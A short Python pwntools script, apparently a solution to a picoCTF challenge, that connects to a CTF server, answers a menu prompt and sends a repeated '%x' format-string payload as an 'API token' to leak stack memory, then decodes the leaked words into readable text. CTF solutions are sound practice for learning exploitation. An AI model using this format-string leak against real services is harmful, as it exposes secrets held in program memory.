#! /usr/bin/python3
from pwn import *

# string to write
s = ""

# open up remote connection
r = remote("mercury.picoctf.net", 20195)

# get to vulnerability
r.recvuntil(b"View my")
r.send(b"1\n")
r.recvuntil(b"What is your API token?\n")

# send string to print stack
r.send(b"%x" + b"-%x" * 30 +  b"\n")


r.recvline()

# read the line
x = r.recvline()

x = x[:-1].decode()

string_on_stack = ""

for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in a[::-1]:
            if b > 32 and b  < 128:
                string_on_stack += chr(b)

print(string_on_stack)
